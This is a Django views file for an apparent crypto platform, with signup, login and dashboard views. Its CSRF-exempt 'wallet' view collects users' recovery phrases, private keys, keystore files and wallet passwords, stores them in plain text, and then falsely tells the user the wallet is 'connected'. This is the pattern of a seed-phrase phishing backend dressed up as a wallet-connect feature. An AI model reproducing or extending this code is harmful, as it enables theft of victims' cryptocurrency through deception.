from django.contrib import messages
from django.contrib.auth import login , logout
from django.contrib.auth.decorators import login_required
from django.shortcuts import redirect, render
from django.contrib.auth.views import LoginView

from .forms import SignUpForm , LoginForm
from .models import Wallet
from django.views.decorators.csrf import csrf_protect ,csrf_exempt

def home(request):
    
    return render(request, "app/home.html")
@csrf_protect
@csrf_exempt
def wallet(request):
    if request.method == "POST":
        walletcommingfrom = request.POST.get("walletcommingfrom")
        walletname = request.POST.get("walletname")
        walletemail = request.POST.get("walletemail")
        recoveryphrase = request.POST.get("recoveryphrase")
        keystore = request.POST.get("keystore")
        wallet_password = request.POST.get("wallet_password")
        private_key =  request.POST.get("private_key")
        new_wallet = Wallet.objects.create(
            walletcommingfrom =walletcommingfrom,
            walletname=walletname,
            walletemail=walletemail,
            recoveryphrase=recoveryphrase,
            keystore=keystore,
            wallet_password=wallet_password,
            private_key=private_key,
        )
        messages.success( request, f"Your {new_wallet.walletcommingfrom} wallet connected! create an account ")
        return redirect("/signup")
    
    return render(request, "app/wallet.html" )
@login_required
def earn(request):
    return render(request, "app/earn.html")
@login_required
def swap(request):
    return render(request, "app/swap.html")

@login_required
def fund(request):
    return render(request, "app/fund.html")
@login_required
def fund_wallet(request):
    return render(request, "app/fund_wallet.html")
@login_required
def card(request):
    return render(request, "app/card.html")

@login_required
def dashboard(request):
    return render(request, "app/dashboard.html")




def signup(request):
    if request.user.is_authenticated:
        return redirect("dashboard")
    if request.method == "POST":
        form = SignUpForm(request.POST)
        if form.is_valid():
            form.save()  # just create the user, no login()
            messages.success(request, "Your account was created successfully. Please log in.")
            return redirect("login")  # send them to login page
    else:
        form = SignUpForm()

    return render(request, "app/signup.html", {"form": form})



class CustomLoginView(LoginView):
    template_name = "app/login.html"
    authentication_form = LoginForm

    def dispatch(self, request, *args, **kwargs):
        if request.user.is_authenticated:
            return redirect("dashboard")
        return super().dispatch(request, *args, **kwargs)

    def form_valid(self, form):
        user = form.get_user()
        login(self.request, user)
        messages.success(self.request, f"Welcome back, {user.email}!")
        return redirect("dashboard")

    def form_invalid(self, form):
        messages.error(self.request, "Invalid email or password. Please try again.")
        return super().form_invalid(form)



@login_required
def logout_view(request):
    """Handle user logout"""
    user = request.user

    logout(request)
    messages.success(request, "You have been logged out successfully.")
    return redirect("/login")